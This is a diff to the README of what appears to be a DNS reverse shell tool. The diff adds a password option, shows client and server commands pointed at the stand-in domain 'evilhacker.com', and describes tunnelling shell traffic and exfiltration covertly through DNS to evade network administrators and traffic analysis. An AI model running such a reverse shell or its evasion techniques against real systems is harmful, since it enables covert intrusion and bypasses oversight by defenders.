@@ -14,7 +14,7 @@ Make sure to run the server first.
 
 ```sh
 $ ./dns_server.py -h
-usage: dns_server.py [-h] [-i INTERFACE] [-p IP] domain
+usage: dns_server.py [-h] [-i INTERFACE] -k KEY domain
 
 DNS Reverse Shell Server
 
@@ -25,9 +25,9 @@ optional arguments:
   -h, --help            show this help message and exit
   -i INTERFACE, --interface INTERFACE
                         Interface to use
-  -p IP, --ip IP        Public IP of server
+  -k KEY, --key KEY     Password to use
 
-# ./dns_server.py evilhacker.com
+# ./dns_server.py -k securepassword evilhacker.com
 ```
 
 Program will now listen on stdin for commands
@@ -38,7 +38,7 @@ Program will now listen on stdin for commands
 
 ```sh
 $ ./dns_client.py -h
-usage: dns_client.py [-h] [-i INTERFACE] [-I INTERVAL] [-p PULSE] [-t TIMEOUT] domain
+usage: dns_client.py [-h] [-i INTERFACE] [-I INTERVAL] [-p PULSE] [-t TIMEOUT] -k KEY domain
 
 DNS Reverse Shell Client
 
@@ -55,8 +55,9 @@ optional arguments:
                         How often to pulse the server in seconds (Lower number means faster response time)
   -t TIMEOUT, --timeout TIMEOUT
                         How long it takes to recover from lost packet in seconds (Lower number means faster recover time)
+  -k KEY, --key KEY     Password to use
 
-# ./dns_client.py evilhacker.com
+# ./dns_client.py -k securepassword evilhacker.com
 ```
 
 ## How it works
@@ -68,10 +69,6 @@ The server program sniffs and filters out only DNS traffic on the indicated netw
 However, there are certain caveats to this program. Due to the nature of UDP, it is possible that some data can be lost in the middle of a transaction. This is very apparent when dealing with slow networks. An increased interval between each packet sent (more information in the program usage) can boost the reliability and covertness of the reverse shell.
 
 ### Improvements
-
-Although the data is encoded with base64, a network administrator can easily reconstruct and decode the packet. Encrypting data with a shared AES-256 key can prevent network administrators or automated network traffic analysis tools from deciphering the content while minimising network traffic overhead.
-
-Randomising the types of DNS queries with A, MX, TXT and CNAME records can also improve the covertness of the exfiltration process.
 
 Randomising the subdomain length can also be used to throw off automated network traffic analysis tools as it may be filtering for subdomains within a certain length at the cost of network traffic overhead.
 
